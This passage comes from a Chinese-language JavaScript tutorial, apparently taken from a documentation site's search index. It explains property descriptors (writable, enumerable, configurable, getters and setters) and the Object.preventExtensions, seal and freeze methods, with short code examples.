\u662f\u539f\u578b\u5bf9\u8c61\uff0c\u5b83\u7684 foo \u5c5e\u6027\u4e0d\u53ef\u5199\u3002 obj \u5bf9\u8c61\u7ee7\u627f proto \uff0c\u4e5f\u4e0d\u53ef\u4ee5\u518d\u81ea\u5b9a\u4e49\u8fd9\u4e2a\u5c5e\u6027\u4e86\u3002\u5982\u679c\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u8fd9\u6837\u505a\u8fd8\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002 \u4f46\u662f\uff0c\u6709\u4e00\u4e2a\u89c4\u907f\u65b9\u6cd5\uff0c\u5c31\u662f\u901a\u8fc7\u8986\u76d6\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\u3002\u539f\u56e0\u662f\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u539f\u578b\u94fe\u4f1a\u88ab\u5b8c\u5168\u5ffd\u89c6\u3002 1 2 3 4 5 6 7 8 9 10 11 var proto = Object . defineProperty ({}, 'foo' , { value : 'a' , writable : false }); var obj = Object . create ( proto ); Object . defineProperty ( obj , 'foo' , { value : 'b' }); obj . foo // \"b\" enumerable \u00b6 enumerable \uff08\u53ef\u904d\u5386\u6027\uff09\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u76ee\u6807\u5c5e\u6027\u662f\u5426\u53ef\u904d\u5386\u3002 JavaScript \u7684\u65e9\u671f\u7248\u672c\uff0c for...in \u5faa\u73af\u662f\u57fa\u4e8e in \u8fd0\u7b97\u7b26\u7684\u3002\u6211\u4eec\u77e5\u9053\uff0c in \u8fd0\u7b97\u7b26\u4e0d\u7ba1\u67d0\u4e2a\u5c5e\u6027\u662f\u5bf9\u8c61\u81ea\u8eab\u7684\u8fd8\u662f\u7ee7\u627f\u7684\uff0c\u90fd\u4f1a\u8fd4\u56de true \u3002 1 2 var obj = {}; 'toString' in obj // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c toString \u4e0d\u662f obj \u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u4f46\u662f in \u8fd0\u7b97\u7b26\u4e5f\u8fd4\u56de true \uff0c\u8fd9\u5bfc\u81f4\u4e86 toString \u5c5e\u6027\u4e5f\u4f1a\u88ab for...in \u5faa\u73af\u904d\u5386\u3002 \u8fd9\u663e\u7136\u4e0d\u592a\u5408\u7406\uff0c\u540e\u6765\u5c31\u5f15\u5165\u4e86\u201c\u53ef\u904d\u5386\u6027\u201d\u8fd9\u4e2a\u6982\u5ff5\u3002\u53ea\u6709\u53ef\u904d\u5386\u7684\u5c5e\u6027\uff0c\u624d\u4f1a\u88ab for...in \u5faa\u73af\u904d\u5386\uff0c\u540c\u65f6\u8fd8\u89c4\u5b9a toString \u8fd9\u4e00\u7c7b\u5b9e\u4f8b\u5bf9\u8c61\u7ee7\u627f\u7684\u539f\u751f\u5c5e\u6027\uff0c\u90fd\u662f\u4e0d\u53ef\u904d\u5386\u7684\uff0c\u8fd9\u6837\u5c31\u4fdd\u8bc1\u4e86 for...in \u5faa\u73af\u7684\u53ef\u7528\u6027\u3002 \u5177\u4f53\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u5c5e\u6027\u7684 enumerable \u4e3a false \uff0c\u4e0b\u9762\u4e09\u4e2a\u64cd\u4f5c\u4e0d\u4f1a\u53d6\u5230\u8be5\u5c5e\u6027\u3002 for..in \u5faa\u73af Object.keys \u65b9\u6cd5 JSON.stringify \u65b9\u6cd5 \u56e0\u6b64\uff0c enumerable \u53ef\u4ee5\u7528\u6765\u8bbe\u7f6e\u201c\u79d8\u5bc6\u201d\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var obj = {}; Object . defineProperty ( obj , 'x' , { value : 123 , enumerable : false }); obj . x // 123 for ( var key in obj ) { console . log ( key ); } // undefined Object . keys ( obj ) // [] JSON . stringify ( obj ) // \"{}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.x \u5c5e\u6027\u7684 enumerable \u4e3a false \uff0c\u6240\u4ee5\u4e00\u822c\u7684\u904d\u5386\u64cd\u4f5c\u90fd\u65e0\u6cd5\u83b7\u53d6\u8be5\u5c5e\u6027\uff0c\u4f7f\u5f97\u5b83\u6709\u70b9\u50cf\u201c\u79d8\u5bc6\u201d\u5c5e\u6027\uff0c\u4f46\u4e0d\u662f\u771f\u6b63\u7684\u79c1\u6709\u5c5e\u6027\uff0c\u8fd8\u662f\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u5b83\u7684\u503c\u3002 \u6ce8\u610f\uff0c for...in \u5faa\u73af\u5305\u62ec\u7ee7\u627f\u7684\u5c5e\u6027\uff0c Object.keys \u65b9\u6cd5\u4e0d\u5305\u62ec\u7ee7\u627f\u7684\u5c5e\u6027\u3002\u5982\u679c\u9700\u8981\u83b7\u53d6\u5bf9\u8c61\u81ea\u8eab\u7684\u6240\u6709\u5c5e\u6027\uff0c\u4e0d\u7ba1\u662f\u5426\u53ef\u904d\u5386\uff0c\u53ef\u4ee5\u4f7f\u7528 Object.getOwnPropertyNames \u65b9\u6cd5\u3002 \u53e6\u5916\uff0c JSON.stringify \u65b9\u6cd5\u4f1a\u6392\u9664 enumerable \u4e3a false \u7684\u5c5e\u6027\uff0c\u6709\u65f6\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u3002\u5982\u679c\u5bf9\u8c61\u7684 JSON \u683c\u5f0f\u8f93\u51fa\u8981\u6392\u9664\u67d0\u4e9b\u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u628a\u8fd9\u4e9b\u5c5e\u6027\u7684 enumerable \u8bbe\u4e3a false \u3002 configurable \u00b6 configurable (\u53ef\u914d\u7f6e\u6027\uff09\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u51b3\u5b9a\u4e86\u662f\u5426\u53ef\u4ee5\u4fee\u6539\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c configurable \u4e3a false \u65f6\uff0c writable \u3001 enumerable \u548c configurable \u90fd\u4e0d\u80fd\u88ab\u4fee\u6539\u4e86\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var obj = Object . defineProperty ({}, 'p' , { value : 1 , writable : false , enumerable : false , configurable : false }); Object . defineProperty ( obj , 'p' , { writable : true }) // TypeError: Cannot redefine property: p Object . defineProperty ( obj , 'p' , { enumerable : true }) // TypeError: Cannot redefine property: p Object . defineProperty ( obj , 'p' , { configurable : true }) // TypeError: Cannot redefine property: p Object . defineProperty ( obj , 'p' , { value : 2 }) // TypeError: Cannot redefine property: p \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.p \u7684 configurable \u5c5e\u6027\u4e3a false \u3002\u7136\u540e\uff0c\u6539\u52a8 writable \u3001 enumerable \u3001 configurable \uff0c\u7ed3\u679c\u90fd\u62a5\u9519\u3002 \u6ce8\u610f\uff0c writable \u5c5e\u6027\u53ea\u6709\u5728 false \u6539\u4e3a true \u65f6\u4f1a\u62a5\u9519\uff0c true \u6539\u4e3a false \u662f\u5141\u8bb8\u7684\u3002 1 2 3 4 5 6 7 var obj = Object . defineProperty ({}, 'p' , { writable : true , configurable : false }); Object . defineProperty ( obj , 'p' , { writable : false }) // \u4fee\u6539\u6210\u529f value \u5c5e\u6027\u7684\u60c5\u51b5\u6bd4\u8f83\u7279\u6b8a\u3002\u53ea\u8981 writable \u548c configurable \u6709\u4e00\u4e2a\u4e3a true \uff0c\u5c31\u5141\u8bb8\u6539\u52a8 value \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var o1 = Object . defineProperty ({}, 'p' , { value : 1 , writable : true , configurable : false }); Object . defineProperty ( o1 , 'p' , { value : 2 }) // \u4fee\u6539\u6210\u529f var o2 = Object . defineProperty ({}, 'p' , { value : 1 , writable : false , configurable : true }); Object . defineProperty ( o2 , 'p' , { value : 2 }) // \u4fee\u6539\u6210\u529f \u53e6\u5916\uff0c writable \u4e3a false \u65f6\uff0c\u76f4\u63a5\u5bf9\u76ee\u6807\u5c5e\u6027\u8d4b\u503c\uff0c\u4e0d\u62a5\u9519\uff0c\u4f46\u4e0d\u4f1a\u6210\u529f\u3002 1 2 3 4 5 6 7 8 var obj = Object . defineProperty ({}, 'p' , { value : 1 , writable : false , configurable : false }); obj . p = 2 ; obj . p // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.p \u7684 writable \u4e3a false \uff0c\u5bf9 obj.p \u76f4\u63a5\u8d4b\u503c\u4e0d\u4f1a\u751f\u6548\u3002\u5982\u679c\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u8fd8\u4f1a\u62a5\u9519\u3002 \u53ef\u914d\u7f6e\u6027\u51b3\u5b9a\u4e86\u76ee\u6807\u5c5e\u6027\u662f\u5426\u53ef\u4ee5\u88ab\u5220\u9664\uff08delete\uff09\u3002 1 2 3 4 5 6 7 8 9 10 var obj = Object . defineProperties ({}, { p1 : { value : 1 , configurable : true }, p2 : { value : 2 , configurable : false } }); delete obj . p1 // true delete obj . p2 // false obj . p1 // undefined obj . p2 // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.p1 \u7684 configurable \u662f true \uff0c\u6240\u4ee5\u53ef\u4ee5\u88ab\u5220\u9664\uff0c obj.p2 \u5c31\u65e0\u6cd5\u5220\u9664\u3002 \u5b58\u53d6\u5668 \u00b6 \u9664\u4e86\u76f4\u63a5\u5b9a\u4e49\u4ee5\u5916\uff0c\u5c5e\u6027\u8fd8\u53ef\u4ee5\u7528\u5b58\u53d6\u5668\uff08accessor\uff09\u5b9a\u4e49\u3002\u5176\u4e2d\uff0c\u5b58\u503c\u51fd\u6570\u79f0\u4e3a setter \uff0c\u4f7f\u7528\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684 set \u5c5e\u6027\uff1b\u53d6\u503c\u51fd\u6570\u79f0\u4e3a getter \uff0c\u4f7f\u7528\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684 get \u5c5e\u6027\u3002 \u4e00\u65e6\u5bf9\u76ee\u6807\u5c5e\u6027\u5b9a\u4e49\u4e86\u5b58\u53d6\u5668\uff0c\u90a3\u4e48\u5b58\u53d6\u7684\u65f6\u5019\uff0c\u90fd\u5c06\u6267\u884c\u5bf9\u5e94\u7684\u51fd\u6570\u3002\u5229\u7528\u8fd9\u4e2a\u529f\u80fd\uff0c\u53ef\u4ee5\u5b9e\u73b0\u8bb8\u591a\u9ad8\u7ea7\u7279\u6027\uff0c\u6bd4\u5982\u5b9a\u5236\u5c5e\u6027\u7684\u8bfb\u53d6\u548c\u8d4b\u503c\u884c\u4e3a\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = Object . defineProperty ({}, 'p' , { get : function () { return 'getter' ; }, set : function ( value ) { console . log ( 'setter: ' + value ); } }); obj . p // \"getter\" obj . p = 123 // \"setter: 123\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.p \u5b9a\u4e49\u4e86 get \u548c set \u5c5e\u6027\u3002 obj.p \u53d6\u503c\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528 get \uff1b\u8d4b\u503c\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528 set \u3002 JavaScript \u8fd8\u63d0\u4f9b\u4e86\u5b58\u53d6\u5668\u7684\u53e6\u4e00\u79cd\u5199\u6cd5\u3002 1 2 3 4 5 6 7 8 9 // \u5199\u6cd5\u4e8c var obj = { get p () { return 'getter' ; }, set p ( value ) { console . log ( 'setter: ' + value ); } }; \u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\uff0c\u867d\u7136\u5c5e\u6027 p \u7684\u8bfb\u53d6\u548c\u8d4b\u503c\u884c\u4e3a\u662f\u4e00\u6837\u7684\uff0c\u4f46\u662f\u6709\u4e00\u4e9b\u7ec6\u5fae\u7684\u533a\u522b\u3002\u7b2c\u4e00\u79cd\u5199\u6cd5\uff0c\u5c5e\u6027 p \u7684 configurable \u548c enumerable \u90fd\u4e3a false \uff0c\u4ece\u800c\u5bfc\u81f4\u5c5e\u6027 p \u662f\u4e0d\u53ef\u904d\u5386\u7684\uff1b\u7b2c\u4e8c\u79cd\u5199\u6cd5\uff0c\u5c5e\u6027 p \u7684 configurable \u548c enumerable \u90fd\u4e3a true \uff0c\u56e0\u6b64\u5c5e\u6027 p \u662f\u53ef\u904d\u5386\u7684\u3002\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u5199\u6cd5\u4e8c\u66f4\u5e38\u7528\u3002 \u6ce8\u610f\uff0c\u53d6\u503c\u51fd\u6570 get \u4e0d\u80fd\u63a5\u53d7\u53c2\u6570\uff0c\u5b58\u503c\u51fd\u6570 set \u53ea\u80fd\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff08\u5373\u5c5e\u6027\u7684\u503c\uff09\u3002 \u5b58\u53d6\u5668\u5f80\u5f80\u7528\u4e8e\uff0c\u5c5e\u6027\u7684\u503c\u4f9d\u8d56\u5bf9\u8c61\u5185\u90e8\u6570\u636e\u7684\u573a\u5408\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var obj = { $n : 5 , get next () { return this . $n ++ }, set next ( n ) { if ( n >= this . $n ) this . $n = n ; else throw new Error ( '\u65b0\u7684\u503c\u5fc5\u987b\u5927\u4e8e\u5f53\u524d\u503c' ); } }; obj . next // 5 obj . next = 10 ; obj . next // 10 obj . next = 5 ; // Uncaught Error: \u65b0\u7684\u503c\u5fc5\u987b\u5927\u4e8e\u5f53\u524d\u503c \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c next \u5c5e\u6027\u7684\u5b58\u503c\u51fd\u6570\u548c\u53d6\u503c\u51fd\u6570\uff0c\u90fd\u4f9d\u8d56\u4e8e\u5185\u90e8\u5c5e\u6027 $n \u3002 \u5bf9\u8c61\u7684\u62f7\u8d1d \u00b6 \u6709\u65f6\uff0c\u6211\u4eec\u9700\u8981\u5c06\u4e00\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\uff0c\u62f7\u8d1d\u5230\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u5b9e\u73b0\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var extend = function ( to , from ) { for ( var property in from ) { to [ property ] = from [ property ]; } return to ; } extend ({}, { a : 1 }) // {a: 1} \u4e0a\u9762\u8fd9\u4e2a\u65b9\u6cd5\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c\u9047\u5230\u5b58\u53d6\u5668\u5b9a\u4e49\u7684\u5c5e\u6027\uff0c\u4f1a\u53ea\u62f7\u8d1d\u503c\u3002 1 2 3 4 extend ({}, { get a () { return 1 } }) // {a: 1} \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 Object.defineProperty \u65b9\u6cd5\u6765\u62f7\u8d1d\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var extend = function ( to , from ) { for ( var property in from ) { if ( ! from . hasOwnProperty ( property )) continue ; Object . defineProperty ( to , property , Object . getOwnPropertyDescriptor ( from , property ) ); } return to ; } extend ({}, { get a (){ return 1 } }) // { get a(){ return 1 } }) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c hasOwnProperty \u90a3\u4e00\u884c\u7528\u6765\u8fc7\u6ee4\u6389\u7ee7\u627f\u7684\u5c5e\u6027\uff0c\u5426\u5219\u53ef\u80fd\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a Object.getOwnPropertyDescriptor \u8bfb\u4e0d\u5230\u7ee7\u627f\u5c5e\u6027\u7684\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u3002 \u63a7\u5236\u5bf9\u8c61\u72b6\u6001 \u00b6 \u6709\u65f6\u9700\u8981\u51bb\u7ed3\u5bf9\u8c61\u7684\u8bfb\u5199\u72b6\u6001\uff0c\u9632\u6b62\u5bf9\u8c61\u88ab\u6539\u53d8\u3002JavaScript \u63d0\u4f9b\u4e86\u4e09\u79cd\u51bb\u7ed3\u65b9\u6cd5\uff0c\u6700\u5f31\u7684\u4e00\u79cd\u662f Object.preventExtensions \uff0c\u5176\u6b21\u662f Object.seal \uff0c\u6700\u5f3a\u7684\u662f Object.freeze \u3002 Object.preventExtensions() \u00b6 Object.preventExtensions \u65b9\u6cd5\u53ef\u4ee5\u4f7f\u5f97\u4e00\u4e2a\u5bf9\u8c61\u65e0\u6cd5\u518d\u6dfb\u52a0\u65b0\u7684\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 var obj = new Object (); Object . preventExtensions ( obj ); Object . defineProperty ( obj , 'p' , { value : 'hello' }); // TypeError: Cannot define property:p, object is not extensible. obj . p = 1 ; obj . p // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj \u5bf9\u8c61\u7ecf\u8fc7 Object.preventExtensions \u4ee5\u540e\uff0c\u5c31\u65e0\u6cd5\u6dfb\u52a0\u65b0\u5c5e\u6027\u4e86\u3002 Object.isExtensible() \u00b6 Object.isExtensible \u65b9\u6cd5\u7528\u4e8e\u68c0\u67e5\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u4f7f\u7528\u4e86 Object.preventExtensions \u65b9\u6cd5\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u68c0\u67e5\u662f\u5426\u53ef\u4ee5\u4e3a\u4e00\u4e2a\u5bf9\u8c61\u6dfb\u52a0\u5c5e\u6027\u3002 1 2 3 4 5 var obj = new Object (); Object . isExtensible ( obj ) // true Object . preventExtensions ( obj ); Object . isExtensible ( obj ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9 obj \u5bf9\u8c61\u4f7f\u7528 Object.preventExtensions \u65b9\u6cd5\u4ee5\u540e\uff0c\u518d\u4f7f\u7528 Object.isExtensible \u65b9\u6cd5\uff0c\u8fd4\u56de false \uff0c\u8868\u793a\u5df2\u7ecf\u4e0d\u80fd\u6dfb\u52a0\u65b0\u5c5e\u6027\u4e86\u3002 Object.seal() \u00b6 Object.seal \u65b9\u6cd5\u4f7f\u5f97\u4e00\u4e2a\u5bf9\u8c61\u65e2\u65e0\u6cd5\u6dfb\u52a0\u65b0\u5c5e\u6027\uff0c\u4e5f\u65e0\u6cd5\u5220\u9664\u65e7\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 var obj = { p : 'hello' }; Object . seal ( obj ); delete obj . p ; obj . p // \"hello\" obj . x = 'world' ; obj . x // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj \u5bf9\u8c61\u6267\u884c Object.seal \u65b9\u6cd5\u4ee5\u540e\uff0c\u5c31\u65e0\u6cd5\u6dfb\u52a0\u65b0\u5c5e\u6027\u548c\u5220\u9664\u65e7\u5c5e\u6027\u4e86\u3002 Object.seal \u5b9e\u8d28\u662f\u628a\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684 configurable \u5c5e\u6027\u8bbe\u4e3a false \uff0c\u56e0\u6b64\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u4e0d\u518d\u80fd\u6539\u53d8\u4e86\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 var obj = { p : 'a' }; // seal\u65b9\u6cd5\u4e4b\u524d Object . getOwnPropertyDescriptor ( obj , 'p' ) // Object { // value: \"a\", // writable: true, // enumerable: true, // configurable: true // } Object . seal ( obj ); // seal\u65b9\u6cd5\u4e4b\u540e Object . getOwnPropertyDescriptor ( obj , 'p' ) // Object { // value: \"a\", // writable: true, // enumerable: true, // configurable: false // } Object . defineProperty ( obj , 'p' , { enumerable : false }) // TypeError: Cannot redefine property: p \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4f7f\u7528 Object.seal \u65b9\u6cd5\u4e4b\u540e\uff0c\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684 configurable \u5c5e\u6027\u5c31\u53d8\u6210\u4e86 false \uff0c\u7136\u540e\u6539\u53d8 enumerable \u5c5e\u6027\u5c31\u4f1a\u62a5\u9519\u3002 Object.seal \u53ea\u662f\u7981\u6b62\u65b0\u589e\u6216\u5220\u9664\u5c5e\u6027\uff0c\u5e76\u4e0d\u5f71\u54cd\u4fee\u6539\u67d0\u4e2a\u5c5e\u6027\u7684\u503c\u3002 1 2 3 4 var obj = { p : 'a' }; Object . seal ( obj ); obj . p = 'b' ; obj . p // 'b' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.seal \u65b9\u6cd5\u5bf9 p \u5c5e\u6027\u7684 value \u65e0\u6548\uff0c\u662f\u56e0\u4e3a\u6b64\u65f6 p \u5c5e\u6027\u7684\u53ef\u5199\u6027\u7531 writable \u51b3\u5b9a\u3002 Object.isSealed() \u00b6 Object.isSealed \u65b9\u6cd5\u7528\u4e8e\u68c0\u67e5\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u4f7f\u7528\u4e86 Object.seal \u65b9\u6cd5\u3002 1 2 3 4 var obj = { p : 'a' }; Object . seal ( obj ); Object . isSealed ( obj ) // true \u8fd9\u65f6\uff0c Object.isExtensible \u65b9\u6cd5\u4e5f\u8fd4\u56de false \u3002 1 2 3 4 var obj = { p : 'a' }; Object . seal ( obj ); Object . isExtensible ( obj ) // false Object.freeze() \u00b6 Object.freeze \u65b9\u6cd5\u53ef\u4ee5\u4f7f\u5f97\u4e00\u4e2a\u5bf9\u8c61\u65e0\u6cd5\u6dfb\u52a0\u65b0\u5c5e\u6027\u3001\u65e0\u6cd5\u5220\u9664\u65e7\u5c5e\u6027\u3001\u4e5f\u65e0\u6cd5\u6539\u53d8\u5c5e\u6027\u7684\u503c\uff0c\u4f7f\u5f97\u8fd9\u4e2a\u5bf9\u8c61\u5b9e\u9645\u4e0a\u53d8\u6210\u4e86\u5e38\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var obj = { p : 'hello' }; Object . freeze ( obj ); obj . p = 'world' ; obj . p // \"hello\" obj . t = 'hello' ; obj . t // undefined delete obj . p // false obj . p // \"hello\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9 obj \u5bf9\u8c61\u8fdb\u884c Object.freeze() \u4ee5\u540e\uff0c\u4fee\u6539\u5c5e\u6027\u3001\u65b0\u589e\u5c5e\u6027\u3001\u5220\u9664\u5c5e\u6027\u90fd\u65e0\u6548\u4e86\u3002\u8fd9\u4e9b\u64cd\u4f5c\u5e76\u4e0d\u62a5\u9519\uff0c\u53ea\u662f\u9ed8\u9ed8\u5730\u5931\u8d25\u3002\u5982\u679c\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u5219\u4f1a\u62a5\u9519\u3002 Object.isFrozen() \u00b6 Object.isFrozen \u65b9\u6cd5\u7528\u4e8e\u68c0\u67e5\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u4f7f\u7528\u4e86 Object.freeze \u65b9\u6cd5\u3002 1 2 3 4 5 6 var obj = { p : 'hello' }; Object . freeze ( obj ); Object . isFrozen ( obj ) // true \u4f7f\u7528 Object.freeze \u65b9\u6cd5\u4ee5\u540e\uff0c Object.isSealed \u5c06\u4f1a\u8fd4\u56de true \uff0c Object.isExtensible \u8fd4\u56de false \u3002 1 2 3 4 5 6 7 8 var obj = { p : 'hello' }; Object . freeze ( obj ); Object . isSealed ( obj ) // true Object . isExtensible ( obj ) // false Object.isFrozen \u7684\u4e00\u4e2a\u7528\u9014\u662f\uff0c\u786e\u8ba4\u67d0\u4e2a\u5bf9\u8c61\u6ca1\u6709\u88ab\u51bb\u7ed3\u540e\uff0c\u518d\u5bf9\u5b83\u7684\u5c5e\u6027\u8d4b\u503c\u3002 1 2 3 4 5 6 7 8 9 var obj = { p : 'hello' }; Object . freeze ( obj ); if ( ! Object . isFrozen ( obj )) { obj . p = 'world' ; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u786e\u8ba4 obj \u6ca1\u6709\u88ab\u51bb\u7ed3\u540e\uff0c\u518d\u5bf9\u5b83\u7684\u5c5e\u6027\u8d4b\u503c\uff0c\u5c31\u4e0d\u4f1a\u62a5\u9519\u4e86\u3002 \u5c40\u9650\u6027 \u00b6 \u4e0a\u9762\u7684\u4e09\u4e2a\u65b9\u6cd5\u9501\u5b9a\u5bf9\u8c61\u7684\u53ef\u5199\u6027\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff1a\u53ef\u4ee5\u901a\u8fc7\u6539\u53d8\u539f\u578b\u5bf9\u8c61\uff0c\u6765\u4e3a\u5bf9\u8c61\u589e\u52a0\u5c5e\u6027\u3002 1 2 3 4 5 6 7 var obj = new Object (); Object . preventExtensions ( obj ); var proto = Object . getPrototypeOf ( obj ); proto . t = 'hello' ; obj . t // hello \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u672c\u8eab\u4e0d\u80fd\u65b0\u589e\u5c5e\u6027\uff0c\u4f46\u662f\u53ef\u4ee5\u5728\u5b83\u7684\u539f\u578b\u5bf9\u8c61\u4e0a\u65b0\u589e\u5c5e\u6027\uff0c\u5c31\u4f9d\u7136\u80fd\u591f\u5728 obj \u4e0a\u8bfb\u5230\u3002 \u4e00\u79cd\u89e3\u51b3\u65b9\u6848\u662f\uff0c\u628a obj \u7684\u539f\u578b\u4e5f\u51bb\u7ed3\u4f4f\u3002 1 2 3 4 5 6 7 8 var obj = new Object (); Object . preventExtensions ( obj ); var proto = Object . getPrototypeOf ( obj ); Object . preventExtensions ( proto ); proto . t = 'hello' ; obj . t // undefined \u53e6\u5916\u4e00\u4e2a\u5c40\u9650\u662f\uff0c\u5982\u679c\u5c5e\u6027\u503c\u662f\u5bf9\u8c61\uff0c\u4e0a\u9762\u8fd9\u4e9b\u65b9\u6cd5\u53ea\u80fd\u51bb\u7ed3\u5c5e\u6027\u6307\u5411\u7684\u5bf9\u8c61\uff0c\u800c\u4e0d\u80fd\u51bb\u7ed3\u5bf9\u8c61\u672c\u8eab\u7684\u5185\u5bb9\u3002 1 2 3 4 5 6 7 8 var obj = { foo : 1 , bar : [ 'a' , 'b' ] }; Object . freeze ( obj ); obj . bar . push ( 'c' ); obj . bar // [\"a\", \"b\", \"c\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.bar \u5c5e\u6027\u6307\u5411\u4e00\u4e2a\u6570\u7ec4\uff0c obj \u5bf9\u8c61\u88ab\u51bb\u7ed3\u4ee5\u540e\uff0c\u8fd9\u4e2a\u6307\u5411\u65e0\u6cd5\u6539\u53d8\uff0c\u5373\u65e0\u6cd5\u6307\u5411\u5176\u4ed6\u503c\uff0c\u4f46\u662f\u6240\u6307\u5411\u7684\u6570\u7ec4\u662f\u53ef\u4ee5\u6539\u53d8\u7684\u3002","title":"\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61"},{"location":"stdlib/attributes/#_1","text":"","title":"\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61"},{"location":"stdlib/attributes/#_2","text":"JavaScript \u63d0\u4f9b\u4e86\u4e00\u4e2a\u5185\u90e8\u6570\u636e\u7ed3\u6784\uff0c\u7528\u6765\u63cf\u8ff0\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u63a7\u5236\u5b83\u7684\u884c\u4e3a\uff0c\u6bd4\u5982\u8be5\u5c5e\u6027\u662f\u5426\u53ef\u5199\u3001\u53ef\u904d\u5386\u7b49\u7b49\u3002\u8fd9\u4e2a\u5185\u90e8\u6570\u636e\u7ed3\u6784\u79f0\u4e3a\u201c\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u201d\uff08attributes object\uff09\u3002\u6bcf\u4e2a\u5c5e\u6027\u90fd\u6709\u81ea\u5df1\u5bf9\u5e94\u7684\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c\u4fdd\u5b58\u8be5\u5c5e\u6027\u7684\u4e00\u4e9b\u5143\u4fe1\u606f\u3002 \u4e0b\u9762\u662f\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 { value : 123 , writable : false , enumerable : true , configurable : false , get : undefined , set : undefined } \u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u63d0\u4f9b6\u4e2a\u5143\u5c5e\u6027\u3002 \uff081\uff09 value value \u662f\u8be5\u5c5e\u6027\u7684\u5c5e\u6027\u503c\uff0c\u9ed8\u8ba4\u4e3a undefined \u3002 \uff082\uff09 writable writable \u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5c5e\u6027\u503c\uff08value\uff09\u662f\u5426\u53ef\u6539\u53d8\uff08\u5373\u662f\u5426\u53ef\u5199\uff09\uff0c\u9ed8\u8ba4\u4e3a true \u3002 \uff083\uff09 enumerable enumerable \u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u5c5e\u6027\u662f\u5426\u53ef\u904d\u5386\uff0c\u9ed8\u8ba4\u4e3a true \u3002\u5982\u679c\u8bbe\u4e3a false 